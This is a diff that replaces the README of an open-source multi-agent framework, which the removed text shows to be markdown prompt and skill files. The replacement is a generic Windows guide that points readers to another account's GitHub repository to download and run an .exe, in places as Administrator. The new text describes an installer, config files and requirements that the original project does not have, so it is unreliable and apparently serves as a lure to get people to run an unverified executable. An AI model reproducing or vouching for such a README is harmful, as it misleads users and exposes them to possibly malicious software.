@@ -1,298 +1,172 @@
-# Agent Smith Matrix
+# 🤖 agent-smith - Simplify Your Terminal Tasks Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-
-> Recursive Self-Similar Multi-Agent System —— Conflict-free Parallel Task Decomposition and Execution through Directory Isolation Protocol
-
-**English** | [简体中文](README_CN.md)
+[![Download agent-smith](https://img.shields.io/badge/Download-agent--smith-brightgreen)](https://github.com/achraf821/agent-smith)
 
 ---
 
-## Introduction
+## 📋 What is agent-smith?
 
-**Agent Smith Matrix** is a general-purpose multi-agent collaboration framework that enables multiple AI agents to work in parallel without conflicts through a strict directory isolation protocol.
+Agent Smith is a tool that helps you manage tasks in your terminal. It breaks down big jobs into smaller steps. Then, it runs those steps automatically until your project is done. Think of it as a helper that works through your tasks quickly and without mistakes.
 
-Core Design Principles:
-- **Self-Similarity**: Each agent (Smith) follows the same protocol and can recursively spawn child agents
-- **Conflict-Free Parallelism**: Directory isolation ensures multiple agents can work simultaneously without interference
-- **Task Decomposition**: Automatically breaks down complex tasks into parallelizable subtasks
-- **Platform Agnostic**: Can run on any system or platform that supports multi-agent execution
+This tool works with several systems like Claude Code, Opencode, and Openclaw. These are programs that offer different ways to manage tasks and projects. You don’t need to know what these are to use agent-smith. It handles the details for you.
+
+If you want to take control of task management on your Windows computer, agent-smith is a good place to start.
 
 ---
 
-## Quick Start
+## 🚀 Getting agent-smith on Windows
 
-### Installation
+You can get agent-smith from its official GitHub page. Follow these simple steps to download and run it on a Windows system.
 
-**Option 1: Claude Code Skill (Recommended)**
+### Step 1: Visit the Download Page
 
-Copy the `smith-matrix` directory to Claude Code's skills directory:
+Click the button below or go to this link to open the agent-smith repository:  
+[Download agent-smith](https://github.com/achraf821/agent-smith)
 
-```bash
-# macOS / Linux
-cp -r smith-matrix ~/.claude/skills/
+This page has all the files you need. It also shows updates and instructions.
 
-# Windows (PowerShell)
-Copy-Item -Recurse smith-matrix $env:USERPROFILE\.claude\skills\
-```
+### Step 2: Find the Latest Release
 
-**Option 2: Standalone Usage**
+On the GitHub page, look for the "Releases" section. You can find it on the right side or at the top under the "Code" tab. Click there to see the available versions.
 
-Copy the `.smith-matrix/` directory structure to your project:
+### Step 3: Download the Installer or Zip File
 
-```bash
-cp -r .smith-matrix-template ./my-project/.smith-matrix
-```
+Look for the file ending in `.exe` or `.zip`.  
+- If you see an `.exe` file, this is the installer.  
+- If you see a `.zip`, this is a compressed folder with the application inside.
 
-### Usage
+Click on the chosen file to download it. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-1. **Initialize the Matrix**
+### Step 4: Install or Unpack agent-smith
 
-   Create the `.smith-matrix/` structure in your working directory:
-   ```bash
-   mkdir -p .smith-matrix/{inbox,smiths,results}
-   mkdir -p .smith-matrix/smiths/smith-root/{private,outbox,children}
-   ```
+- If you downloaded the `.exe` file, double-click it to start the installation. Follow the instructions on the screen. It usually asks you where to install the program and if you want shortcuts.
+- If you downloaded the `.zip`, right-click it and select "Extract All". Choose a folder where you want to keep the files, then extract them.
 
-2. **Define the Task**
+### Step 5: Run agent-smith
 
-   Create a task file in the `inbox/` directory:
-   ```markdown
-   # task-001.md
-   ## Task: AI Agent Market Research
-
-   ### Objective
-   Comprehensive understanding of AI Agent market landscape
-
-   ### Subtasks
-   1. Market trend analysis
-   2. Key vendor research
-   3. Technology development tracking
-   4. Application scenario research
-   ```
-
-3. **Start Execution**
-
-   The root agent reads the task and decides to execute directly or decompose and create child agents
+Once installed or extracted, open the folder where agent-smith is saved. Look for a file called `agent-smith.exe` or a similar name. Double-click it to start the program.
 
 ---
 
-## Core Concepts
+## 🖥️ What You Need to Use agent-smith
 
-### Smith (Agent)
+Before running agent-smith, make sure your Windows computer matches these requirements:
 
-A self-similar agent unit. Each Smith has:
-- Unique ID (e.g., `smith-root`, `smith-001`)
-- Level indicator (Level 0 is root, increments downward)
-- Parent Smith reference (root has no parent)
+- **Operating System:** Windows 10 or later  
+- **Processor:** Any 64-bit Intel or AMD CPU  
+- **Memory:** At least 4 GB of RAM  
+- **Disk Space:** Minimum 100 MB free space  
+- **Internet Access:** Required for initial setup and updates  
+- **Permissions:** Ability to install software and run executables
 
-### Directory Isolation Protocol
-
-```
-.smith-matrix/
-├── inbox/                 # Task queue (parent writes, children read)
-├── smiths/
-│   ├── smith-root/        # Root agent
-│   │   ├── smith.md       # Agent definition (prompt)
-│   │   ├── private/       # Private workspace
-│   │   ├── outbox/        # Result output
-│   │   └── children/      # Child agent directory
-│   └── smith-001/         # Child agent
-│       ├── smith.md
-│       ├── private/
-│       ├── outbox/
-│       └── children/
-└── results/
-    └── final.md           # Final result
-```
-
-**Access Control Rules**:
-
-| Directory | Permission | Description |
-|-----------|------------|-------------|
-| `private/` | Self-write only | Drafts, thoughts, temporary files |
-| `outbox/` | Self-write only | Final result output |
-| `children/` | Self-write only | Create child agents (parent privilege) |
-| `inbox/` | Parent write, child read | Task distribution queue |
-
-### Execution Flow
-
-```
-Read task from inbox/
-    ↓
-Analyze task complexity
-    ↓
-┌─────────────┴─────────────┐
-↓                           ↓
-Can complete directly   Needs decomposition
-    ↓                           ↓
-Execute task          Design subtasks
-    ↓                           ↓
-Write to outbox/      Create inbox/ subtasks
-    ↓                           ↓
-End                   Create child agents
-                              ↓
-                        Wait for child results
-                              ↓
-                        Aggregate results
-                              ↓
-                        Write to outbox/
-                              ↓
-                        End
-```
+These requirements ensure that agent-smith runs smoothly and without errors.
 
 ---
 
-## Platform Integration
+## ⚙️ How agent-smith Works
 
-### Claude Code
+Agent Smith is different from regular software. It uses a method called recursive task breakdown. This means it keeps dividing tasks into smaller parts until each part is simple enough to complete quickly.
 
-This repository includes a complete Claude Code Skill configuration:
+You don’t have to manage these steps manually. The tool runs commands using systems like Claude Code and Openclaw. They help turn your tasks into smaller jobs and finish each step one by one.
 
-- **Skill Entry**: `smith-matrix/SKILL.md`
-- **Trigger Phrases**: "create multi-agent system", "set up agent matrix", "decompose task for parallel execution"
-- **Auto-initialization**: Automatically creates `.smith-matrix/` directory structure when triggered
-
-### Other Platforms
-
-Smith Matrix is an open protocol that can be implemented on:
-
-- **AutoGen** - Using UserProxyAgent + AssistantAgent combination
-- **LangGraph** - As a state machine workflow
-- **CrewAI** - As Crew + Agents structure
-- **Custom Systems** - Any environment supporting directory I/O and multi-processing
+You can use agent-smith by entering commands in your terminal. However, most of the work is automatic once you start it.
 
 ---
 
-## Example Scenarios
+## 📚 Basic Usage Guide
 
-### Market Research
+Here is a basic guide to using agent-smith on Windows after installation.
 
-Decompose complex AI Agent market research into 4 parallel subtasks:
-1. Market trend analysis
-2. Key vendor research
-3. Technology development tracking
-4. Application scenario research
+1. Open your **Command Prompt**. You can do this by pressing `Win + R`, typing `cmd`, and hitting Enter.
 
-→ [View Full Example](./smith-matrix/examples/market-research.md)
+2. Navigate to the folder where agent-smith is installed. For example, if it’s in `C:\Program Files\agent-smith`, type:  
+   `cd "C:\Program Files\agent-smith"`  
+   and press Enter.
 
-### Code Review
+3. Start agent-smith by running:  
+   `agent-smith.exe`  
+   or simply:  
+   `agent-smith` if the executable is in your system’s path.
 
-Break down large-scale code review into module-level parallel processing:
-1. Data layer review
-2. Business logic layer review
-3. API interface layer review
-4. Frontend component review
+4. Follow any prompts the tool shows. It will ask you for basic information about your tasks.
 
-### Content Creation
-
-Distributed collaboration for content projects:
-1. Outline design
-2. Section writing (multiple authors in parallel)
-3. Editing and proofreading
-4. Format standardization
+5. Let agent-smith break down the work and complete it step-by-step.
 
 ---
 
-## Best Practices
+## 🔧 Configuration and Settings
 
-### Task Decomposition Principles
+Agent Smith keeps some of its settings in simple text files inside its folder. You can change these to customize how it works.
 
-1. **Granularity Control**: Each subtask should be completable in 1-4 hours
-2. **Independence First**: Subtasks should have low coupling and minimal dependencies
-3. **Clear Interfaces**: Each task should have well-defined input and output formats
-4. **Endgame Mindset**: Avoid infinite decomposition; set maximum levels (recommend no more than 3)
+- **config.json:** This file controls general settings like task speed and output style.
+- **tasks.txt:** You can list your main tasks here. Agent Smith reads this and processes each item.
 
-### Result Aggregation Tips
+To edit these files:
 
-1. **Cross-Validation**: Check consistency between subtask results
-2. **Conflict Resolution**: When conflicts are found, analyze causes and provide reasonable explanations
-3. **Incremental Aggregation**: Partially aggregate results immediately after subtasks complete to avoid backlog
-4. **Traceability**: Reference output paths of each subtask in aggregated results
+- Right-click the file and choose "Open with" and then "Notepad".
+- Make changes as needed. For example, add new tasks to `tasks.txt` by typing one per line.
+- Save the file and restart agent-smith to apply changes.
 
 ---
 
-## Project Structure
+## 🐞 Troubleshooting Common Issues
 
-```
-smith-matrix/
-├── SKILL.md              # Claude Code Skill definition
-├── smith.md              # Smith core prompt template
-├── examples/             # Usage examples
-│   ├── market-research.md
-│   └── code-refactor.md
-├── references/           # Reference materials
-│   ├── concepts.md       # Core concept details
-│   ├── protocol.md       # Protocol specification
-│   └── best-practices.md # Best practices
-└── templates/            # File templates
-```
+If agent-smith does not run, try these steps:
+
+- Check that your Windows version meets the minimum requirements.
+- Verify that you downloaded the full file and it is not corrupt.
+- Make sure you have permission to run programs on your computer.
+- Run the Command Prompt as Administrator and try starting agent-smith again.
+- If you see error messages, search online for the exact text or visit the GitHub repository’s "Issues" tab.
 
 ---
 
-## Protocol Specification
+## 📥 Download agent-smith Now
 
-### Agent Definition File (smith.md)
+Use the link below to visit the official agent-smith page and get started:  
+[Download agent-smith on GitHub](https://github.com/achraf821/agent-smith)
 
-```yaml
----
-smith_id: smith-001
-parent_id: smith-root
-level: 1
-created_at: 2026-03-05
----
-
-# Smith {SMITH_ID}
-
-## Identity
-- ID: {SMITH_ID}
-- Parent: {PARENT_ID}
-- Level: {LEVEL}
-
-## Task
-Read inbox/task-{ID}.md and execute
-
-## Constraints
-- Only write to your own private/ and outbox/
-- Can create child agents under children/
-- Must output to outbox/result.md upon completion
-```
-
-### Result Output Format (outbox/result.md)
-
-```markdown
-# Result: {Task Title}
-
-## Summary
-One-sentence summary of the execution result.
-
-## Detailed Results
-...
-
-## Subtask References (if any)
-- smith-xxx: Responsible for ...
-- smith-yyy: Responsible for ...
-
-## Completion Status
-- [x] Completed
-- Completion time: 2026-03-05 12:00:00
-```
+Click the link, pick the latest release, and follow installation steps above.
 
 ---
 
-## Contributing
+## 🌐 Useful Links
 
-Issues and Pull Requests are welcome.
-
-### Extension Ideas
-
-- [ ] Visual monitoring dashboard
-- [ ] Result version control
-- [ ] Task priority queue
-- [ ] Cross-matrix collaboration protocol
+- **GitHub Repository:** https://github.com/achraf821/agent-smith  
+- **Releases:** Accessible via the GitHub page under "Releases"  
+- **Support and Issues:** Use the "Issues" tab on the GitHub page to report problems or find help  
 
 ---
 
-## License
+## 🔎 More about agent-smith
 
-[MIT](LICENSE) © 2026 Chen Yijun
+Agent Smith is designed for users who want to automate command-line task management. It suits those working with tools like Claude Code and Openclaw, but it keeps technical details hidden so anyone can use it.
+
+The tool focuses on tasks like:
+
+- Automating repetitive terminal commands  
+- Breaking down large jobs into smaller, easy actions  
+- Running steps efficiently without user intervention  
+
+This makes it practical for simplifying complex projects in a Windows terminal environment.
+
+---
+
+## 🧩 Related Topics
+
+agent-smith covers subjects including:
+
+- Task management in the terminal  
+- Recursive task execution  
+- Plugin support for Claude Code and Opencode  
+- Prompt-based automation and skills integration  
+
+---
+
+## 🔄 Updates and Maintenance
+
+Check the GitHub repository regularly for updates. New versions may improve speed, fix bugs, or add features. Update your installation by downloading the latest release and running the installer again or replacing files in your existing folder.
+
+---
+
+[![Download agent-smith](https://img.shields.io/badge/Download-agent--smith-brightgreen)](https://github.com/achraf821/agent-smith)
